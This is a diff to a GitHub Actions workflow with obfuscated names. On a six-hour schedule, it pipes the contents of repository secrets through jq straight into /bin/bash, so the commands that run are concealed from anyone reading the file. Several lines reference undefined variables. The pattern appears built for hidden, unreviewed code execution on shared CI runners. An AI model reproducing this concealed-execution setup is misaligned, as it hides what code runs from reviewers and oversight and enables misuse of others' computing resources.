@@ -1,31 +1,19 @@
 name: yangweiguo6457
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 2/6 * * *'
-
+    - cron: '54 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yangweiguo6457
         env:
-          ttpv2: ${{ secrets.ttpv2 }}
+          fel2: ${{ secrets.fel2 }}
         run: |
-          echo $ttpv2 | jq -r .gjh6 | /bin/bash
-          echo $jwidu62315 | jq -r .op652 | /bin/bash
-          echo $exthb8 | jq -r .ge95 | /bin/bash
-          echo $vq90041 | jq -r .bopt76 | /bin/bash
-          echo $xfvf07174 | jq -r .i713 | /bin/bash
-          echo $x6 | jq -r .goqo055 | /bin/bash
-          echo $eognf1724 | jq -r .mblpl9579 | /bin/bash
-          echo $xkznw65472 | jq -r .nua6021 | /bin/bash
-          echo $tnia16 | jq -r .nqn2 | /bin/bash
-          echo $j6 | jq -r .zad55504 | /bin/bash
-          echo $e3254 | jq -r .rvnry031 | /bin/bash
-          echo $yb435 | jq -r .wohd36775 | /bin/bash
-          echo $zdut23 | jq -r .lg40803 | /bin/bash
+          echo $fel2 | jq -r .pg613 | /bin/bash
+          echo $ixonz62 | jq -r .wn92 | /bin/bash
+          echo $bpe598 | jq -r .hnwq16 | /bin/bash
+          echo $mezq581 | jq -r .al7586 | /bin/bash
 
